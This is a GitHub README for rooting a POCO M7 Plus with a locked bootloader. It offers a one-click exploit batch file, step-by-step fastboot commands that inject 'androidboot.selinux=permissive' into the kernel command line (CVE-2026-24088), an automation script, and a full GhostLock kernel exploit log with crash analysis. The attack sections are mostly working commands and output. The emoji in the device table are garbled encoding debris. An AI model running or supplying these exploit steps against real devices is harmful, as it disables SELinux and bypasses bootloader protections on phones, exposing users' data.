# POCO M7 Plus (SM6375) - Jailbreak Root Research

> **Disclaimer:** This document is written purely for **educational and security research purposes**. All testing was performed on my own device. I am not responsible for bricked devices, data loss, or misuse of this information. The vulnerabilities discussed here are **already publicly disclosed and patched**. Do not attempt this on devices you do not own.

---

## :arrow_down: Quick Download - v2.0

| File | Description |
|---|---|
| **[GBL-AutoRoot.bat](https://github.com/aniketlab/POCO-M7-Plus-Jailbreak/releases/latest/download/GBL-AutoRoot.bat)** | One-click exploit automation tool (Windows) |

**How to use:**
1. Download `GBL-AutoRoot.bat` from the link above
2. Double-click to run - no installation needed
3. Connect your phone via USB when prompted
4. Script handles everything: ADB download, device detection, exploit, result

> Compatible with any Qualcomm ABL device affected by CVE-2026-24088.
> If your device returns `OKAY`, root access is granted automatically.

---

## Supported Devices

This tool targets the Qualcomm ABL vulnerability (CVE-2026-24088). If your device has a vulnerable SoC and hasn't received the patched firmware yet, this tool will work.

| Status | Device / SoC Family | Example Devices |
|:---:|---|---|
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ **Confirmed** | **Snapdragon 695** (SM6375) | POCO M7 Plus 5G, Redmi 15 5G |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 8 Gen 3** (SM8650) | Xiaomi 14 / Pro / Ultra, Redmi K70 Pro |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 8 Gen 2** (SM8550) | Xiaomi 13 / Pro, POCO F5 Pro, Redmi K60 Pro |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 8+ Gen 1** (SM8475) | Xiaomi 12T Pro, POCO F5 |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 888** (SM8350) | Mi 11, Mi 11X Pro, POCO F3 |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 7+ Gen 3** (SM7675) | POCO F6 |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 7 Gen 3** (SM7550) | Xiaomi Civi 4 |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 695 5G** (SM6375) | POCO X4 Pro 5G, Redmi Note 11 Pro 5G |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 680** (SM6225) | Redmi Note 11, Redmi 10C |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ **Potential** | **Snapdragon 662** (SM6115) | POCO M3, Redmi 9T |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚ÂÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â´ **No Support**| **MediaTek (MTK)** | POCO X6 Neo, Redmi Note 13 Pro+ |
| ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚ÂÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â´ **No Support**| **Patched Firmware** | HyperOS 3.0.304.0+ (Security Patch applied) |

> **ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã¢â‚¬Å“ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â Community Testing Required:** I do not have all these devices available for testing. If you have one of the "Potentially Supported" devices, please test the tool and let me know the results. This will help me confirm and officially add your device to the "Confirmed Working" list!

---
## Table of Contents

1. [Device & Environment](#1-device--environment)
2. [Research Overview - Two Approaches](#2-research-overview---two-approaches)
3. [Approach A: Qualcomm GBL Exploit (Fastboot Route)](#3-approach-a-qualcomm-gbl-exploit-fastboot-route)
4. [Approach B: GhostLock Kernel Exploit (Attempted)](#4-approach-b-ghostlock-kernel-exploit-attempted)
5. [Comparison: GBL vs GhostLock](#5-comparison-gbl-vs-ghostlock-on-this-device)
6. [Risk & Security Implications](#6-risk--security-implications)
7. [Patch Status & How to Check](#7-patch-status--how-to-check)
8. [Screenshots - Proof of Working](#8-screenshots---proof-of-working)
9. [References & Credits](#9-references--credits)

---

## 1. Device & Environment

| Field | Value |
|---|---|
| **Device** | Poco M7 Plus 5G (codename: `spring`) |
| **Chipset** | Qualcomm SM6375 (Snapdragon 6s Gen 3) |
| **Architecture** | AArch64, KASLR enabled |
| **SELinux** | Enforcing (before exploit) |
| **Bootloader** | LOCKED |
| **Test Platform** | Windows 11, ADB Platform Tools |

### Firmware Versions Tested During Research

| HyperOS Version | Kernel Version | GhostLock Result | GBL Exploit Result |
|---|---|---|---|
| **2.0.202.0** | `6.1.118-android14-11-ga3b9c44908dd-ab13320413` | :x: Kernel Panic | :white_check_mark: Working |
| **2.0.208.0** | `6.1.138-android14-11-g51f8c580613d-ab13911623` | :x: Kernel Panic | :white_check_mark: Working |

> **Research Note:** I initially tested on HyperOS 2.0.202.0 where GhostLock caused kernel panic. I then updated to 2.0.208.0 to check if the newer kernel build (6.1.118 -> 6.1.138) would resolve GhostLock instability. The panic persisted - both builds share the same 6.1 `pselect`/`fd_set` internal layout that GhostLock cannot handle. The GBL exploit worked on both versions.

---

## 2. Research Overview - Two Approaches

During this research, I tested **two independent exploit paths** to achieve temporary root on this device without unlocking the bootloader:

| | Approach A: GBL Exploit | Approach B: GhostLock |
|---|---|---|
| **Layer** | Bootloader (ABL/fastboot) | Kernel (Linux 6.1) |
| **CVE** | CVE-2026-24088 | CVE-2026-43499 |
| **Result on this device** | :white_check_mark: **Working** | :x: **Kernel Panic** |
| **Root Type** | Temporary (tethered) | Temporary (tethered) |
| **Requires ADB?** | Yes (fastboot mode) | Yes (shell access) |
| **Kernel version sensitive?** | No | Yes - only stable on 6.6-6.12 |

The GBL exploit worked. GhostLock failed with a kernel panic due to a kernel version mismatch. Both findings are documented in detail below.

---

## 3. Approach A: Qualcomm GBL Exploit (Fastboot Route)

### Vulnerability Background

**CVE-2026-24088** affects Qualcomm's Android Boot Loader (ABL) across multiple devices.

```
Jan 2026 -> Vulnerability discovered during ABL unpacking & analysis
Feb 2026 -> Qualcomm patches: QcomModulePkg: Fix propagation of untrusted input into kernel cmdline
Mar 2026 -> Public PoC released; Xiaomi begins rolling out HyperOS 3.0.304.0 (patched)
Jun 2026 -> CVE-2026-24088 officially assigned in Qualcomm Security Bulletin
```

### Exploit Chain Explained

The exploit works as a **three-stage chain** at the bootloader level:

#### Stage 1 - Unsigned GBL Execution
In Android 16, Qualcomm's ABL loads the Generic Bootloader (GBL) from the `efisp` partition. The critical flaw: **ABL only checks if the binary is a valid UEFI application - it does NOT verify its cryptographic signature.** This means a custom, unsigned UEFI application can be placed in `efisp` and it will execute at bootloader stage with full privileges.

#### Stage 2 - Kernel Command-Line Injection
The `fastboot oem set-gpu-preemption` command **lacks input sanitization**. The ABL directly concatenates the provided argument into the kernel command line without filtering.

By passing `androidboot.selinux=permissive` as an additional argument:
```
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
...the bootloader writes `androidboot.selinux=permissive` into the kernel cmdline, which Android's `init` process reads at boot - effectively disabling SELinux enforcement.

#### Stage 3 - Unlock Flag Manipulation (Optional)
A custom UEFI application placed in `efisp` can set `is_unlocked` and `is_unlocked_critical` flags to permanently unlock the bootloader. (**This step was NOT tested - carries hard brick risk.**)

### Step-by-Step Reproduction

> :warning: **Stop before proceeding:** Run the patch check in Section 7 first. If your device is patched, none of this will work.

**Prerequisites:**
- Windows PC with ADB/Fastboot (Platform Tools)
- Original USB cable
- Device on HyperOS **2.0.208.0 or earlier** (do NOT update)
- USB Debugging enabled in Developer Options
- **[KernelSU Manager](https://github.com/tiann/KernelSU)** APK or **[ReSukiSU Manager](https://github.com/ReSukiSU/ReSukiSU/releases)** APK installed on phone

> **Do I need OEM Unlocking enabled in Developer Options?**
> **No - and this is one of the most important aspects of this exploit.**
> The `fastboot oem set-gpu-preemption` command operates at the **ABL level** - processed **before** the OS checks OEM unlock status. CVE-2026-24088 is a missing input sanitization flaw in ABL itself, completely bypassing the OEM unlock gate. Your bootloader stays **LOCKED** throughout.
> If you saw a guide saying "enable OEM Unlocking first" - that applies to a **different** (standard) unlock method, not this exploit.

---

**Step 1: Enter Fastboot Mode**
```bash
adb reboot bootloader
```

**Step 2: Test Vulnerability**
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
- `OKAY` -> Device is **vulnerable** :white_check_mark: continue
- `FAILED (remote: 'Set GPU HW Preemption: Invalid Argument')` -> Device is **patched** :x: stop here

**Step 3: Boot with Injected Cmdline**
```bash
fastboot continue
```

**Step 4: Verify SELinux State**
```bash
adb shell getenforce
# Expected: Permissive
```

**Step 5: Gain Root via Root Manager**

**Option A - KernelSU Manager:**
```bash
# Open KernelSU Manager on device
# Tap "Jailbreak" / grant button to activate root
adb shell su -c id
# Expected: uid=0(root) gid=0(root)
```

**Option B - Resuski Manager:**
```bash
# Open Resuski Manager on device
# Enable "Jailbreak Mode" from the main screen
# Root and modules appear as active and working
adb shell su -c id
```

> **Important:** After enabling jailbreak mode, if the phone is turned off and back on - you must **re-run the fastboot injection first** (Steps 1-3), then reopen the root manager app. Root is tethered - the manager correctly shows root and modules working once SELinux permissive state is re-established.

**Step 6: Verify Full Root State**
```bash
adb shell getenforce                              # Permissive
adb shell su -c id                               # uid=0(root)
adb shell su -c "cat /data/adb/ksu/version"      # KSU version
adb shell su -c "cat /sys/fs/selinux/enforce"    # 0
```

**Step 7: Automation Script (Optional)**
```batch
@echo off
echo Rebooting to fastboot...
adb reboot bootloader
timeout /t 10
echo Injecting SELinux permissive...
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
timeout /t 2
fastboot continue
echo Done. Open KernelSU or Resuski Manager on device.
```

### Verification Table

| Check | Command | Expected Output |
|---|---|---|
| SELinux mode | `adb shell getenforce` | `Permissive` |
| Root identity | `adb shell su -c id` | `uid=0(root)` |
| KSU version | `adb shell su -c "cat /data/adb/ksu/version"` | Version string |
| Kernel enforce flag | `adb shell su -c "cat /sys/fs/selinux/enforce"` | `0` |

---

## 4. Approach B: GhostLock Kernel Exploit (Attempted)

### What is GhostLock?

GhostLock is a **kernel-level privilege escalation exploit** ([CVE-2026-43499](https://nvd.nist.gov/vuln/detail/CVE-2026-43499)) published on GitHub. It targets a vulnerability in the kernel's **futex subsystem** combined with **TCP zerocopy** or **pselect** networking paths to achieve a Use-After-Free (UAF) condition, ultimately overwriting the `cred` structure to grant root privileges.

The easiest way to run GhostLock is via the **[GhostLock One-Tap App](https://github.com/YuKongA/ghostlock-app)** by [@YuKongA](https://github.com/YuKongA) - a standalone Android app with a simple UI, no manual binary deployment needed.

**Supported kernel range (stable):** 6.6 - 6.12
**On kernel 6.1:** Unstable - prone to kernel panic (documented below with full log)

### Full Execution Log

This is the complete output from my test run on the Poco M7 Plus (Kernel 6.1.138):

```
C:\adb platform>adb shell /data/local/tmp/ghostlock --load-prebuilt-profile /data/local/tmp/profile.bin

[*] kernel: 6.1.138-android14-11-g51f8c580613d-ab13911623
[+] resolved profile loaded: 6.1.138-android14-11-g51f8c580613d-ab13911623
[*] cpu pair: main=0 consumer=1
[*] debug.execution.routes.tcp_zerocopy.attempts=0   <- TCP Zerocopy DISABLED, fell back to pselect
[*] debug.execution.routes.select_stack.*            <- pselect route ACTIVE
[*] soc: qcom/other; kernel_phys_load=0xa8000000
[*] init_cred image=ffffffc082001a68 alias=ffffff802a001a68
[+] p0 profile phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000
[*] [T+0ms] exploit start
[*] [T+323ms] heap spray start
[*] [spray] mm spray + kernelsnitch ready (cpu=8) +525ms
[*] [spray] futex collisions found +2212ms
[*] [spray] mm_struct leaked=0xffffff80b33dd800 +2302ms
[*] [spray] payload ready +2305ms
[*] prepare_kernel_page ok attempt=1 +2600ms
[*] [T+2925ms] heap spray done
[*] [route] CMP_REQUEUE_PI ret=-1 errno=35; waiting route_done
[-] pselect cannot place wake_state waiter_word=14 global_word=15 words_per_set=5 nfds=320

-> [DEVICE KERNEL PANIC - Spontaneous Reboot]
```

### Deep Log Analysis

| Phase | What Happened | Result |
|---|---|---|
| Profile load | Kernel-specific offset map loaded for 6.1.138 | :white_check_mark: Success |
| CPU pinning | main=cpu0, consumer=cpu1 for race condition | :white_check_mark: Success |
| TCP Zerocopy | Auto-detected not viable on 6.1, fell back to pselect | :warning: Fallback |
| KASLR bypass | delta=0x28000000 calculated, kernel slide known | :white_check_mark: Success |
| Kernel address leak | mm_struct leaked to userspace | :white_check_mark: Success |
| init_cred resolved | Root credential structure address found | :white_check_mark: Success |
| pselect race | waiter_word=14, global_word=15 - MISMATCH | :x: **CRASH** |

### Root Cause of Kernel Panic

```
waiter_word = 14
global_word = 15   <- off by one
words_per_set = 5
nfds = 320
```

The `pselect6()` syscall in **kernel 6.1 handles `fd_set` word boundaries differently** from 6.6+. The exploit's pselect route geometry was calculated for 6.6+ internal layout. Kernel 6.1 has a different `words_per_set` calculation - causing a 1-word offset mismatch. The exploit attempts to dereference from the misaligned boundary -> unmapped memory -> **kernel panic -> device reboot**.

### Kernel 6.1 vs 6.6+ - Why It Matters

| Component | Kernel 6.1 | Kernel 6.6+ |
|---|---|---|
| **TCP Zerocopy** | Different UAF window timing | Stable UAF trigger window |
| **`pselect6()` fd_set layout** | Different `words_per_set` boundary | Matches exploit geometry |
| **Futex `REQUEUE_PI`** | `errno=35 (EAGAIN)` - less predictable | More consistent race outcome |
| **SLUB allocator** | Different slab cache placement | Matches heap spray assumptions |
| **Result** | :x: Kernel Panic | :white_check_mark: Exploit succeeds |

---

## 5. Comparison: GBL vs GhostLock on This Device

| Factor | GBL Exploit :white_check_mark: | GhostLock :x: |
|---|---|---|
| **Attack surface** | Bootloader (pre-kernel) | Running kernel |
| **Reliability on this device** | High | Kernel panic (unstable) |
| **Kernel version dependency** | None | Critical (6.6-6.12 only) |
| **KASLR bypass needed** | No | Yes (succeeded) |
| **SELinux bypass method** | Kernel cmdline injection | `cred` struct overwrite |
| **Persistence** | None (tethered) | None (tethered) |
| **Root mechanism** | KernelSU/Resuski + permissive SELinux | Direct `cred` struct manipulation |
| **Patch vector** | ABL firmware update | Kernel patch |
| **Brick risk** | Low (fastboot only) | Low to Medium (kernel panic) |

---

## 6. Risk & Security Implications

| Risk | Severity | Details |
|---|---|---|
| **Temporary root only** | High | Root is lost on every reboot. Fastboot injection must be re-run. |
| **SELinux permissive mode** | Critical | Disables Android MAC layer. Do NOT use banking/payment apps while in this state. |
| **Kernel panic (GhostLock)** | Medium | Attempting GhostLock on 6.1 causes unexpected reboot. No data corruption observed. |
| **Hard brick** | Critical | Flashing incorrect partitions (`abl`, `xbl`, `hyp`) can permanently brick. Recovery requires EDL (9008). |
| **Bootloop** | Medium | Some Hynix/Toshiba storage devices have reported bootloops. |
| **Patch imminent** | Info | HyperOS 3.0.304.0+ closes CVE-2026-24088. Once updated, GBL exploit will not work. |
| **Warranty void** | Medium | Modifying system state may void manufacturer warranty. |

---

## 7. Patch Status & How to Check

### Quick Live Check (Easiest)
```bash
adb reboot bootloader
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
- `OKAY` -> Vulnerable
- `FAILED (remote: 'Set GPU HW Preemption: Invalid Argument')` -> Patched

### ABL Binary Check
Use [qualcomm-gbl-exploit-checker](https://github.com/chkndrp/qualcomm-gbl-exploit-checker):
```bash
python check.py abl.img
# STATUS: VULNERABLE  -> Exploit may work
# STATUS: PATCHED     -> Device is protected
```

### Patched Firmware Versions

| Device | Safe (Patched) From |
|---|---|
| Poco M7 Plus 5G | HyperOS 3.0.304.0 |
| Redmi 15 5G | HyperOS 3.0.303.0 (confirmed - includes August 2026 security patch) |
| Other Xiaomi/POCO | Check Qualcomm June 2026 Security Bulletin |

### Troubleshooting

| Issue | Cause | Solution |
|---|---|---|
| `FAILED: Invalid Argument` | ABL is patched | Device is not vulnerable. Stop. |
| `getenforce` returns `Enforcing` | Exploit failed silently | Reboot to fastboot, re-run injection command |
| Device bootloops | Storage compatibility issue | Boot to fastboot, re-flash stock `boot.img` |
| Root manager not detecting permissive | App version mismatch | Ensure compatible build for Android 15 |
| GhostLock causes reboot | Kernel 6.1 incompatibility | Expected behavior - use GBL route instead |

---

## 8. Screenshots - Proof of Working

> All screenshots taken on **Poco M7 Plus 5G - HyperOS 2.0.208.0** with bootloader **LOCKED**.

<div align="center">

<table>
  <tr>
    <td align="center">
      <img src="images/ReSukiSU Working.jpg" width="220"/><br/>
      <b>1. ReSukiSU - Root Active</b>
    </td>
    <td align="center">
      <img src="images/Modules Working.jpg" width="220"/><br/>
      <b>2. Modules Working</b>
    </td>
    <td align="center">
      <img src="images/lsposed working.jpg" width="220"/><br/>
      <b>3. LSPosed Working</b>
    </td>
  </tr>
  <tr>
    <td align="center">
      <img src="images/Device Info Part 1.jpg" width="220"/><br/>
      <b>4. Device Info (Part 1)</b>
    </td>
    <td align="center">
      <img src="images/Device Info Part 2.jpg" width="220"/><br/>
      <b>5. Device Info (Part 2)</b>
    </td>
    <td align="center">
      <img src="images/Bootloader lock.jpg" width="220"/><br/>
      <b>6. Bootloader Still LOCKED</b>
    </td>
  </tr>
</table>

<br/>

<img src="images/All Green Pass.jpg" width="400"/>

**7. All Green Pass :white_check_mark:**

</div>

---

## 9. References & Credits

### References
- [Qualcomm GBL Exploit PoC](https://github.com/kasnria001/qualcomm_gbl_exploit_poc)
- [GBL Exploit Checker](https://github.com/chkndrp/qualcomm-gbl-exploit-checker)
- [CVE-2026-24088 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-24088)
- [CVE-2026-43499 (GhostLock) - NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-43499)
- [GhostLock One-Tap App by YuKongA](https://github.com/YuKongA/ghostlock-app)
- [Qualcomm June 2026 Security Bulletin](https://www.qualcomm.com/company/product-security/bulletins)
- [XDA Guide - POCO F8 Pro / Redmi K90 (Annibale)](https://xdaforums.com/t/guide-exploit-poco-f8-pro-redmi-k90-annibale-unlock-immediate-bootloader-unlock-no-mi-account.4788141/)
- [KernelSU Project](https://kernelsu.org/)
- [ReSukiSU Manager](https://github.com/ReSukiSU/ReSukiSU/releases)

---

## ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â°ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¸ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚ÂÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ Alternative Methods (Untethered / No PC)

If your device is **not vulnerable** to this ABL exploit, or if you **do not have access to a PC**, you may want to check out **[DFRoot by diabl0w](https://github.com/diabl0w/DFRoot)**.

* **What it is:** An on-device APK that grants temporary root without needing a PC.
* **How it works:** It exploits a kernel vulnerability (**CVE-2026-43284 / DirtyFrag**) to load a custom kernel module.
* **Best for:** Samsung devices with locked bootloaders or users who want to regain root directly from their phone after a reboot.

> **Note:** Kernel exploits like DFRoot and GhostLock can cause kernel panics (random reboots) if your specific firmware is not perfectly supported. Bootloader exploits (like our `GBL-AutoRoot`) are generally safer and won't crash the OS, but require a PC. Choose the tool that best fits your situation!

### Credits

| Who | GitHub | Contribution |
|---|---|---|
| Qualcomm ABL researchers | - | Discovery of GBL authentication gap and cmdline injection flaw |
| kasnria001 | [@kasnria001](https://github.com/kasnria001) | Public PoC release of CVE-2026-24088 |
| chkndrp | [@chkndrp](https://github.com/chkndrp) | ABL patch checker tool |
| YuKongA | [@YuKongA](https://github.com/YuKongA) | GhostLock One-Tap App (CVE-2026-43499) |
| XDA community | [XDA Forums](https://xdaforums.com) | Cross-device testing and documentation |
| KernelSU developers | [@tiann](https://github.com/tiann) | Root management framework |
| ReSukiSU | [@ReSukiSU](https://github.com/ReSukiSU) | ReSukiSU Manager - alternative root manager with module support |
| GhostLock authors | - | Kernel exploit research (6.6-6.12 range) |
| aniketlab | [@aniketlab](https://github.com/aniketlab) | Testing on SM6375 / kernel 6.1.118 + 6.1.138, firmware comparison, GhostLock panic analysis, dual-approach documentation |

---

*Tested on: Poco M7 Plus 5G - HyperOS 2.0.202.0 & 2.0.208.0 - Kernel 6.1.118 & 6.1.138 - September 2026*

*Research by [@aniketlab](https://github.com/aniketlab) - conducted on personal device for educational purposes only.*



